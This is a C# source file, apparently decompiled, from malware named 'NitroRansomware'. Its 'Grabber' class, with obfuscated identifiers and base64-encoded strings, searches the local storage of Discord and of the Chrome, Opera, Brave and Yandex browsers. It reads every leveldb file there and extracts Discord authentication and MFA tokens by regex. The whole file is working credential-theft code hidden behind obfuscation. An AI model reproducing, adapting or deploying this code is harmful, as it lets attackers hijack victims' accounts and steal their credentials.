using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace NitroRansomware;

internal class Grabber
{
	private static List<string> H5VEeCdL8GZoGfef8l5S難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化 = new List<string>();

	private static void p5O50Kp94iZt1U7z2Ugs()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		H5VEeCdL8GZoGfef8l5S難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.Add(folderPath + Encoding.UTF8.GetString(Convert.FromBase64String("XERpc2NvcmQ=")));
		H5VEeCdL8GZoGfef8l5S難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.Add(folderPath + Encoding.UTF8.GetString(Convert.FromBase64String("XGRpc2NvcmRjYW5hcnk=")));
		H5VEeCdL8GZoGfef8l5S難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.Add(folderPath + Encoding.UTF8.GetString(Convert.FromBase64String("XGRpc2NvcmRwdGI=")));
		H5VEeCdL8GZoGfef8l5S難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.Add(folderPath + Encoding.UTF8.GetString(Convert.FromBase64String("XFxPcGVyYSBTb2Z0d2FyZVxPcGVyYSBTdGFibGU=")));
		H5VEeCdL8GZoGfef8l5S難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.Add(folderPath2 + Encoding.UTF8.GetString(Convert.FromBase64String("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHQ=")));
		H5VEeCdL8GZoGfef8l5S難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.Add(folderPath2 + Encoding.UTF8.GetString(Convert.FromBase64String("XEJyYXZlU29mdHdhcmVcQnJhdmUtQnJvd3NlclxVc2VyIERhdGFcRGVmYXVsdA==")));
		H5VEeCdL8GZoGfef8l5S難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.Add(folderPath2 + Encoding.UTF8.GetString(Convert.FromBase64String("XFlhbmRleFxZYW5kZXhCcm93c2VyXFVzZXIgRGF0YVxEZWZhdWx0")));
	}

	public static List<string> hU8AdbxO7CH7csbcQpe4()
	{
		p5O50Kp94iZt1U7z2Ugs();
		List<string> list = new List<string>();
		foreach (string item in H5VEeCdL8GZoGfef8l5S難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化)
		{
			if (!Directory.Exists(item))
			{
				continue;
			}
			string path = item + Encoding.UTF8.GetString(Convert.FromBase64String("XExvY2FsIFN0b3JhZ2VcbGV2ZWxkYg=="));
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			FileInfo[] files = directoryInfo.GetFiles(Encoding.UTF8.GetString(Convert.FromBase64String("Ki5sZGI=")));
			foreach (FileInfo fileInfo in files)
			{
				string input = fileInfo.OpenText().ReadToEnd();
				foreach (Match item2 in Regex.Matches(input, Encoding.UTF8.GetString(Convert.FromBase64String("W1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mjd9"))))
				{
					list.Add(item2.Value);
				}
				foreach (Match item3 in Regex.Matches(input, Encoding.UTF8.GetString(Convert.FromBase64String("bWZhXC5bXHctXXs4NH0="))))
				{
					list.Add(item3.Value);
				}
			}
		}
		return list;
	}
}
